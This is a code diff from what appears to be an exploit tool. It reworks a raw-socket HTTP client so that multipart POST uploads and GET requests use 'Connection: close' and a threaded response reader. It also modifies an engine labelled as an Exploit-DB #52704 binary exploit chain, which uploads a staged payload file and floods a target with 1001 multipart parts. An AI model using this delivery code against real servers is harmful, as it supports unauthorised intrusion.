@@ -931,57 +931,78 @@ class RawHttpTarget:
     def post(self, body: bytes, boundary: bytes, read_cap: int = 1 << 20,
              timeout: Optional[float] = None, extra_headers: Optional[Dict[str, str]] = None) -> bytes:
         extra = "".join(f"{k}: {v}\r\n" for k, v in (extra_headers or {}).items())
-        conn_val = "keep-alive" if self.keep_alive else "close"
         hdr = (
             f"POST {self.path} HTTP/1.1\r\n"
             f"Host: {self.host}:{self.port}\r\n"
             f"{extra}"
-            f"Content-Type: multipart/form-data; boundary={boundary.decode('latin1')}\r\n"
+            f"Content-Type: multipart/form-data; boundary={boundary.decode('latin1', errors='replace')}\r\n"
             f"Content-Length: {len(body)}\r\n"
-            f"Connection: {conn_val}\r\n\r\n"
+            "Connection: close\r\n"
+            "\r\n"
         ).encode()
 
-        s = self.get_socket()
-        req_timeout = timeout or self.timeout
+        s = self._connect()
+        s.settimeout(timeout or self.timeout)
+        data = bytearray()
+
+        def _reader() -> None:
+            try:
+                while len(data) < read_cap:
+                    chunk = s.recv(65536)
+                    if not chunk:
+                        break
+                    data.extend(chunk)
+            except OSError:
+                pass
+
+        reader = threading.Thread(target=_reader, daemon=True)
+        reader.start()
         try:
-            s.sendall(hdr)
-            mv = memoryview(body)
-            for off in range(0, len(body), 262144):
-                s.sendall(mv[off:off + 262144])
-            return self._read_http_response(s, read_cap, req_timeout)
-        except OSError:
-            # Reconnect and retry once if existing connection broke
-            self.close()
-            s = self.get_socket()
             try:
                 s.sendall(hdr)
                 mv = memoryview(body)
                 for off in range(0, len(body), 262144):
                     s.sendall(mv[off:off + 262144])
-                return self._read_http_response(s, read_cap, req_timeout)
             except OSError:
-                self.close()
-                return b""
+                pass  # worker aborts during body upload
+            reader.join(timeout=(timeout or self.timeout) + 1.0)
+            return bytes(data)
+        finally:
+            try:
+                s.close()
+            except Exception:
+                pass
 
     def get(self, path: str, read_cap: int = 1 << 20) -> Tuple[int, bytes]:
-        conn_val = "keep-alive" if self.keep_alive else "close"
-        hdr = f"GET {path} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\nConnection: {conn_val}\r\n\r\n".encode()
-        s = self.get_socket()
+        if path and not path.startswith("/"):
+            path = "/" + path
+        hdr = (
+            f"GET {path} HTTP/1.1\r\n"
+            f"Host: {self.host}:{self.port}\r\n"
+            "Connection: close\r\n"
+            "\r\n"
+        ).encode()
+        s = self._connect()
+        s.settimeout(self.timeout)
+        data = bytearray()
         try:
             s.sendall(hdr)
-            resp = self._read_http_response(s, read_cap, self.timeout)
-        except OSError:
-            self.close()
-            s = self.get_socket()
             try:
-                s.sendall(hdr)
-                resp = self._read_http_response(s, read_cap, self.timeout)
+                while len(data) < read_cap:
+                    chunk = s.recv(65536)
+                    if not chunk:
+                        break
+                    data.extend(chunk)
             except OSError:
-                self.close()
-                return (0, b"")
-        head, _, body = resp.partition(b"\r\n\r\n")
-        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
-        return (int(m.group(1)) if m else 0), body
+                pass
+        finally:
+            try:
+                s.close()
+            except Exception:
+                pass
+        head, _, body = bytes(data).partition(b"\r\n\r\n")
+        m = re.match(rb"HTTP/1\.[01]\s+(\d{3})", head)
+        return (int(m.group(1)) if m else 0), bytes(body)
 
 # ---------------------------------------------------------------------------
 # EXPLOIT-DB #52704 BINARY EXPLOIT CHAIN
@@ -1026,7 +1047,7 @@ class ExploitDB52704Engine:
 
     def _file_part(self) -> dict:
         data = self.staged_payload if self.staged_payload is not None else b"A" * 64
-        return {"name": "f", "filename": "payload.sh", "data": data}
+        return {"name": "f", "filename": "a.txt", "data": data}
 
     def rotate(self) -> None:
         parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
